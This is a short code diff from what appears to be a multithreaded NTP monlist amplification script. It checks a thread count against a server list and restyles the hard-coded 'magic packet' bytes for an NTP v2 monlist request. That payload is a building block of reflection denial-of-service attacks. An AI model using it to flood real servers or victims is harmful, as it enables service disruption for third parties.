@@ -55,7 +55,7 @@ if  numberthreads > int(len(ntplist)):
 	exit(0)
 
 #Magic Packet aka NTP v2 Monlist Packet
-data=str("\x17\x00\x03\x2a") + str("\x00")*4
+data = "\x17\x00\x03\x2a" + "\x00" * 4
 
 #Hold our threads
 threads = []
